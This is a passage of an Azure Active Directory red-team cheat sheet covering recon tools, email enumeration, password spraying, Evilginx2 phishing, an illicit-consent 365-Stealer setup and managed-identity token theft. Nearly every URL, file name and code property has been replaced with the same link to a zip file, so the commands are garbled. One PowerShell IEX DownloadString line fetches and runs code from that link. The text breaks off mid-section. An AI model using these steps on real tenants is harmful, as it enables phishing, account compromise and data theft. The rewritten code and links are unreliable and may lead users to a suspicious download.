# Azure Active Directory

Original Source:[Swisskyrepo](https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip%20and%20Resources/Cloud%20-%20Azure%https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip)

## PreReq Requirements and free training

[Webcast: OPSEC Fundamentals for Remote Red Teams](https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip)

[EDITED EDITION — Getting Started in Pentesting The Cloud–Azure | Beau Bullock | 1-Hour](https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip)

[Workshop:Breaching The Cloud Perimeter w/ Beau Bullock](https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip)

[Microsoft Penetration Testing](https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip)

[Penetration Testing Rules of Engagement](https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip)

## Current Bug Bounties

[Azure SSRF Research Challenge](https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip)

## Commando VM

Repo Location: [Commando VM](https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip)

Post Commando Tools to install: [Connect to all Microsoft 365 services in a single PowerShell window](https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip)

## Summary

* [Azure Recon Tools](#azure-recon-tools)
* [Enumeration](#enumeration)
    * [Enumerate valid emails](#enumerate-valid-emails)
    * [Enumerate Azure Subdomains](#enumerate-azure-subdomains)
    * [Enumerate tenant with Azure AD Powershell](#enumerate-tenant-with-azure-ad-powershell)
    * [Enumerate tenant with Az Powershell](#enumerate-tenant-with-az-powershell)
    * [Enumerate tenant with az cli](#enumerate-tenant-with-az-cli)
    * [Enumerate manually](#enumerate-manually)
    * [Enumeration methodology](#enumeration-methodology)
* [Phishing with Evilginx2](#phishing-with-evilginx2)
* [Illicit Consent Grant](#illicit-consent-grant)
* [Token from Managed Identity](#token-from-managed-identity)
    * [Azure API via Powershell](#azure-api-via-powershell)
    * [Azure API via Python Version](#azure-api-via-python-version)
    * [Get Tokens](#get-tokens)
    * [Use Tokens](#use-tokens)
    * [Refresh Tokens](#refresh-token)
* [Stealing Tokens](#stealing-tokens)
    * [Stealing tokens from az cli](#stealing-tokens-from-az-cli)
    * [Stealing tokens from az powershell](#stealing-tokens-from-az-powershell)
* [Add Credentials to All Enterprise Applications](#add-credentials-to-all-enterprise-applications)
* [Spawn SSH for Azure Web App](#spawn-ssh-for-azure-web-app)
* [Azure Storage Blob](#azure-storage-blob)
    * [Enumerate blobs](#enumerate-blobs)
    * [SAS URL](#sas-url)
    * [List and download blobs](#list-and-download-blobs)
* [Runbook Automation](#runbook-automation)
    * [Create a Runbook](#create-a-runbook)
    * [Persistence via Automation accounts](#persistence-via-automation-accounts)
* [Virtual Machine RunCommand](#virtual-machine-runcommand)
* [KeyVault Secrets](#keyvault-secrets)
* [Pass The Certificate](#pass--the-certificate)
* [Pass The PRT](#pass-the-prt)
* [Intunes Administration](#intunes-administration)
* [Dynamic Group Membership](#dynamic-group-membership)
* [Administrative Unit](#administrative-unit)
* [Deployment Template](#deployment-template)
* [Application Proxy](#application-proxy)
* [Conditional Access](#conditional-access)
* [Azure AD](#azure-ad)
    * [Azure AD vs Active Directory](#azure-ad-vs-active-directory)
    * [Password Spray](#password-spray)
    * [Convert GUID to SID](#convert-guid-to-sid)
* [Azure AD Connect ](#azure-ad-connect)
    * [Azure AD Connect - Password extraction](#azure-ad-connect---password-extraction)
    * [Azure AD Connect - MSOL Account's password and DCSync](#azure-ad-connect---msol-accounts-password-and-dcsync)
    * [Azure AD Connect - Seamless Single Sign On Silver Ticket](#azure-ad-connect---seamless-single-sign-on-silver-ticket)
* [References](#references)

## Azure Recon Tools

* **ROADTool** 
    ```powershell
    pipenv shell
    roadrecon auth [-h] [-u USERNAME] [-p PASSWORD] [-t TENANT] [-c CLIENT] [--as-app] [--device-code] [--access-token ACCESS_TOKEN] [--refresh-token REFRESH_TOKEN] [-f TOKENFILE] [--tokens-stdout]
    roadrecon gather [-h] [-d DATABASE] [-f TOKENFILE] [--tokens-stdin] [--mfa]
    roadrecon auth -u test@<TENANT NAME>https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip -p <PASSWORD>
    roadrecon gather
    roadrecon gui
    ```
* **StormSpotter**
    ```powershell
    # https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip

    # session 1 - backend
    pipenv shell
    python https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip

    # session 2 - frontend
    cd C:\Tools\stormspotter\frontend\dist\spa\
    https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip serve -p 9091 --history

    # session 3 - collector
    pipenv shell
    az login -u test@<TENANT NAME>https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip -p <PASSWORD>
    python C:\Tools\stormspotter\stormcollector\https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip cli

    # Web access on http://localhost:9091
    Username: neo4j
    Password: BloodHound
    Server: bolt://localhost:7687
    ```
* **Azure Hound**
    ```powershell
    # https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip

    . C:\Tools\AzureHound\https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip
    Invoke-AzureHound -Verbose

    # GUI access
    bolt://localhost:7687
    Username: neo4j
    Password: BloodHound

    # Cypher query example:
    MATCH p = (n)-[r]->(g:AZKeyVault) RETURN p

    # Change object ID's to names in Bloodhound
    MATCH (n) WHERE https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip IS NOT NULL AND https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip <> "" AND https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip IS NULL SET https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip = https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip

    # Custom Queries : https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip
    ```
* List of Microsoft portals: https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip
* **Azucar** : Azucar automatically gathers a variety of configuration data and analyses all data relating to a particular subscription in order to determine security risks.
    ```powershell
    # You should use an account with at least read-permission on the assets you want to access
    git clone https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip
    PS> Get-ChildItem -Recurse c:\Azucar_V10 | Unblock-File

    PS> .\https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip -AuthMode UseCachedCredentials -Verbose -WriteLog -Debug -ExportTo PRINT
    PS> .\https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip -ExportTo CSV,JSON,XML,EXCEL -AuthMode Certificate_Credentials -Certificate C:\AzucarTest\https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip -ApplicationId 00000000-0000-0000-0000-000000000000 -TenantID 00000000-0000-0000-0000-000000000000
    PS> .\https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip -ExportTo CSV,JSON,XML,EXCEL -AuthMode Certificate_Credentials -Certificate C:\AzucarTest\https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip -CertFilePassword MySuperP@ssw0rd! -ApplicationId 00000000-0000-0000-0000-000000000000 -TenantID 00000000-0000-0000-0000-000000000000

    # resolve the TenantID for an specific username
    PS> .\https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip -ResolveTenantUserName https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip
    ```
* **Azurite Explorer** and **Azurite Visualizer** : Enumeration and reconnaissance activities in the Microsoft Azure Cloud.
    ```powershell
    git clone https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip
    git clone https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip
    git submodule init
    git submodule update
    PS> Import-Module AzureRM
    PS> Import-Module https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip
    PS> Review-AzureRmSubscription
    PS> Review-CustomAzureRmSubscription
    ```
* **MicroBurst** - MicroBurst includes functions and scripts that support Azure Services discovery, weak configuration auditing, and post exploitation actions such as credential dumping
    ```powershell
    $ git clone https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip
    PS C:> Import-Module .\https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip
    PS C:> Import-Module .\https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip
    PS C:> Get-AzureDomainInfo -folder MicroBurst -Verbose
    ```
* **SkyArk** - Discover the most privileged users in the scanned Azure environment - including the Azure Shadow Admins.   
    Require:
    - Read-Only permissions over Azure Directory (Tenant)
    - Read-Only permissions over Subscription
    - Require AZ and AzureAD module or administrator right

    ```powershell
    $ git clone https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip
    $ powershell -ExecutionPolicy Bypass -NoProfile
    PS C> Import-Module .\https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip -force
    PS C> Start-AzureStealth

    or in the Cloud Console

    PS C> IEX (New-Object https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip).DownloadString('https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip')  
    PS C> Scan-AzureAdmins  
* **PowerZure** - 
    ```powershell
    require az module !
    $ git clone https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip
    $ ipmo .\PowerZure
    $ Set-Subscription -Id [idgoeshere]

    # Reader
    $ Get-Runbook, Get-AllUsers, Get-Apps, Get-Resources, Get-WebApps, Get-WebAppDetails

    # Contributor
    $ Execute-Command -OS Windows -VM Win10Test -ResourceGroup Test-RG -Command "whoami"
    $ Execute-MSBuild -VM Win10Test  -ResourceGroup Test-RG -File "https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip"
    $ Get-AllSecrets # AllAppSecrets, AllKeyVaultContents
    $ Get-AvailableVMDisks, Get-VMDisk # Download a virtual machine's disk

    # Owner
    $ Set-Role -Role Contributor -User https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip -Resource Win10VMTest
    
    # Administrator
    $ Create-Backdoor, Execute-Backdoor
    ```
    
## Enumeration

### Enumerate valid emails

> By default, O365 has a lockout policy of 10 tries, and it will lock out an account for one (1) minute.

* Validate email 
    ```powershell
    PS> C:\Python27\https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip C:\Tools\o365creeper\https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip -f C:\Tools\https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip -o C:\Tools\https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip
    admin@<TENANT NAME>https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip   - VALID
    root@<TENANT NAME>https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip    - INVALID
    test@<TENANT NAME>https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip    - VALID
    contact@<TENANT NAME>https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip - INVALID
    ```
* Extract email lists with a valid credentials : https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip

#### Password spraying

```powershell
PS> . C:\Tools\MSOLSpray\https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip
PS> Invoke-MSOLSpray -UserList C:\Tools\https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip -Password <PASSWORD> -Verbose
```

### Enumerate Azure Subdomains

```powershell
PS> . C:\Tools\MicroBurst\Misc\https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip
PS> Invoke-EnumerateAzureSubDomains -Base <TENANT NAME> -Verbose
Subdomain Service
--------- -------
<TENANT NAME>https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip Email
<TENANT NAME>https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip Microsoft Hosted Domain
```

### Enumerate tenant with Azure AD Powershell

```powershell
Import-Module C:\Tools\AzureAD\https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip
Import-Module C:\Tools\AzureADPreview\https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip
PS> $passwd = ConvertTo-SecureString "<PASSWORD>" -AsPlainText -Force
PS> $creds = New-Object https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip("test@<TENANT NAME>https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip", $passwd)
PS Az> Connect-AzureAD -Credential $creds

PS AzureAD> Get-AzureADUser -All $true
PS AzureAD> Get-AzureADUser -All $true | select UserPrincipalName
PS AzureAD> Get-AzureADGroup -All $true
PS AzureAD> Get-AzureADDevice
PS AzureAD> Get-AzureADDirectoryRole -Filter "DisplayName eq 'Global Administrator'" | Get-AzureADDirectoryRoleMember
PS AzureADPreview> Get-AzureADMSRoleDefinition | ?{$https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip -eq $False} | select DisplayName
```

### Enumerate tenant with Az Powershell

```powershell
PS> $passwd = ConvertTo-SecureString "<PASSWORD>" -AsPlainText -Force
PS> $creds = New-Object https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip ("test@<TENANT NAME>https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip", $passwd)
PS Az> Connect-AzAccount -Credential $creds

PS Az> Get-AzResource
PS Az> Get-AzRoleAssignment -SignInName test@<TENANT NAME>https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip
PS Az> Get-AzVM | fl
PS Az> Get-AzWebApp | ?{$https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip -notmatch "functionapp"}
PS Az> Get-AzFunctionApp
PS Az> Get-AzStorageAccount | fl
PS Az> Get-AzKeyVault
```

### Enumerate tenant with az cli

```powershell
PS> az login -u test@<TENANT NAME>https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip -p <PASSWORD>
PS> az vm list
PS> az vm list --query "[].[name]" -o table
PS> az webapp list
PS> az functionapp list --query "[].[name]" -o table
PS> az storage account list
PS> az keyvault list
```

### Enumerate manually

* Federation with Azure AD or O365
    ```powershell
    https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip<USER>@<DOMAIN>&xml=1
    https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip<TENANT NAME>https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip
    ```
* Get the Tenant ID
    ```powershell
    https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip<DOMAIN>https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip
    https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip<TENANT NAME>https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip
    ```

## Enumeration methodology

```powershell
# Check Azure Joined 
PS> https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip /status
+----------------------------------------------------------------------+
| Device State |
+----------------------------------------------------------------------+
 AzureAdJoined : YES
 EnterpriseJoined : NO
 DomainJoined : NO
 Device Name : jumpvm

# Enumerate resources
PS Az> Get-AzResource

# Enumerate role assignments
PS Az> Get-AzRoleAssignment -Scope /subscriptions/<SUBSCRIPTION-ID>https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip<VM-NAME>`

# Get info on a role
PS Az> Get-AzRoleDefinition -Name "Virtual Machine Command Executor"

# Get info user
PS AzureAD> Get-AzureADUser -ObjectId <ID>
PS AzureAD> Get-AzureADUser -ObjectId test@<TENANT NAME>https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip | fl * 

# List all groups
PS AzureAD> Get-AzureADGroup -All $true

# Get members of a group
PS Az> Get-AzADGroup -DisplayName '<GROUP-NAME>'
PS Az> Get-AzADGroupMember -GroupDisplayName '<GROUP-NAME>' | select UserPrincipalName

# Get Azure AD information
PS> Import-Module C:\Tools\AADInternals\https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip
PS AADInternals> Get-AADIntLoginInformation -UserName admin@<TENANT NAME>https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip
PS AADInternals> Get-AADIntTenantID -Domain <TENANT NAME>https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip # Get Tenant ID
PS AADInternals> Invoke-AADIntReconAsOutsider -DomainName <DOMAIN> # Get all the information

# Check if there is a user logged-in to az cli
PS> az ad signed-in-user show

# Check AppID Alternative Names/Display Name 
PS AzureAD> Get-AzureADServicePrincipal -All $True | ?{$https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip -eq "<APP-ID>"} | fl


# Get all application objects registered using the current tenant
PS AzureAD> Get-AzureADApplication -All $true

# Get all details about an application
PS AzureAD> Get-AzureADApplication -ObjectId <ID> | fl *

# List all VM's the user has access to
PS Az> Get-AzVM 
PS Az> Get-AzVM | fl

# Get all function apps
PS Az> Get-AzFunctionApp

# Get all webapps
PS Az> Get-AzWebApp
PS Az> Get-AzWebApp | select-object Name, Type, Hostnames

# List all storage accounts
PS Az> Get-AzStorageAccount
PS Az> Get-AzStorageAccount | fl

# List all keyvaults
PS Az> Get-AzKeyVault
```

## Phishing with Evilginx2

```powershell
PS C:\Tools> evilginx2 -p C:\Tools\evilginx2\phishlets
: config domain https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip
: config ip 10.10.10.10
: phishlets hostname o365 https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip
: phishlets get-hosts o365

Create a DNS entry for https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip and https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip, type A, pointing to your machine

# copy certificate and enable the phishing
PS C:\Tools> Copy-Item C:\Users\Username\.evilginx\crt\https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip C:\Users\Username\.evilginx\crt\https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip\https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip
PS C:\Tools> Copy-Item C:\Users\Username\.evilginx\crt\https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip C:\Users\Username\.evilginx\crt\https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip\https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip
: phishlets enable o365

# get the phishing URL
: lures create o365
: lures get-url 0
```

## Illicit Consent Grant

> The attacker creates an Azure-registered application that requests access to data such as contact information, email, or documents. The attacker then tricks an end user into granting consent to the application so that the attacker can gain access to the data that the target user has access to. 

Check if users are allowed to consent to apps: `PS AzureADPreview> (GetAzureADMSAuthorizationPolicy).PermissionGrantPolicyIdsAssignedToDefaultUserRole`
* **Disable user consent** : Users cannot grant permissions to applications.
* **Users can consent to apps from verified publishers or your organization, but only for permissions you select** : All users can only consent to apps that were published by a verified publisher and apps that are registered in your tenant
* **Users can consent to all apps** : allows all users to consent to any permission which doesn't require admin consent,
* **Custom app consent policy**

### Register Application

1. Login to https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip > Azure Active Directory
2. Click on **App registrations** > **New registration**
3. Enter the Name for our application
4. Under support account types select **"Accounts in any organizational directory (Any Azure AD directory - Multitenant)"**
5. Enter the Redirect URL. This URL should be pointed towards our 365-Stealer application that we will host for hosting our phishing page. Make sure the endpoint is `https://<DOMAIN/IP>:<PORT>/login/authorized`.
6. Click **Register** and save the **Application ID**

### Configure Application

1. Click on `Certificates & secrets`
2. Click on `New client secret` then enter the **Description** and click on **Add**.
3. Save the **secret**'s value.
4. Click on API permissions > Add a permission
5. Click on Microsoft Graph > **Delegated permissions**
6. Search and select the below mentioned permissions and click on Add permission
    * https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip 
    * https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip / https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip
    * https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip
    * https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip
    * https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip
    * https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip 
    * https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip
    * https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip

### Setup 365-Stealer

:warning: Default port for 365-Stealer phishing is 443

- Run XAMPP and start Apache
- Clone 365-Stealer into `C:\xampp\htdocs\`
    * `git clone https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip`
- Install the requirements
    * Python3
    * PHP CLI or Xampp server
    * `pip install -r https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip`
- Enable sqlite3 (Xampp > Apache config > https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip) and restart Apache
- Edit `https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip` if needed
    - Disable IP whitelisting `$enableIpWhiteList = false;`
- Go to 365-Stealer Management portal > Configuration (http://localhost:82/365-stealer/yourVictims)
    - **Client Id** (Mandatory): This will be the Application(Client) Id of the application that we registered.
    - **Client Secret** (Mandatory): Secret value from the Certificates & secrets tab that we created.
    - **Redirect URL** (Mandatory): Specify the redirect URL that we entered during registering the App like `https://<Domain/IP>/login/authorized` 
    - **Macros Location**: Path of macro file that we want to inject.
    - **Extension in OneDrive**: We can provide file extensions that we want to download from the victims account or provide `*` to download all the files present in the victims OneDrive. The file extensions should be comma separated like txt, pdf, docx etc. 
    - **Delay**: Delay the request by specifying time in seconds while stealing
- Create a Self Signed Certificate to use HTTPS
- Run the application either click on the button or run this command : `python https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip --run-app`
    - `--no-ssl`: disable HTTPS
    - `--port`: change the default listening port
    - `--token`: provide a specific token
    - `--refresh-token XXX --client-id YYY --client-secret ZZZ`: use a refresh token
- Find the Phishing URL: go to `https://<IP/Domain>:<Port>` and click on **Read More** button or in the console.

**Mitigation**: Enable `Do not allow user consent` for applications in the "Consent and permissions menu".


## Token from Managed Identity

> **MSI_ENDPOINT** is an alias for **IDENTITY_ENDPOINT**, and **MSI_SECRET** is an alias for **IDENTITY_HEADER**.

Find IDENTITY_HEADER and IDENTITY_ENDPOINT from the environment : `env`

Most of the time, you want a token for one of these resources: 
* https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip
* https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip
* https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip
* https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip


### Azure API via Powershell

Get **access_token** from **IDENTITY_HEADER** and **IDENTITY_ENDPOINT**: `system('curl "$https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip" -H secret:$IDENTITY_HEADER');`. 

Then query the Azure REST API to get the **subscription ID** and more .

```powershell
$Token = 'eyJ0eX..'
$URI = 'https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip'
# $URI = 'https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip'
$RequestParams = @{
 Method = 'GET'
 Uri = $URI
 Headers = @{
 'Authorization' = "Bearer $Token"
 }
}
(Invoke-RestMethod @RequestParams).value 

# List resources and check for runCommand privileges
$URI = 'https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip'
$URI = 'https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip<RG-NAME>https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip<https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip'
```

### Azure API via Python Version

```py
IDENTITY_ENDPOINT = https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip['IDENTITY_ENDPOINT']
IDENTITY_HEADER = https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip['IDENTITY_HEADER']

print("[+] Management API")
cmd = 'curl "%https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip" -H secret:%s' % (IDENTITY_ENDPOINT, IDENTITY_HEADER)
val = https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip(cmd).read()
print("Access Token: "+https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip(val)["access_token"])
print("ClientID/AccountID: "+https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip(val)["client_id"])

print("\r\n[+] Graph API")
cmd = 'curl "%https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip" -H secret:%s' % (IDENTITY_ENDPOINT, IDENTITY_HEADER)
val = https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip(cmd).read()
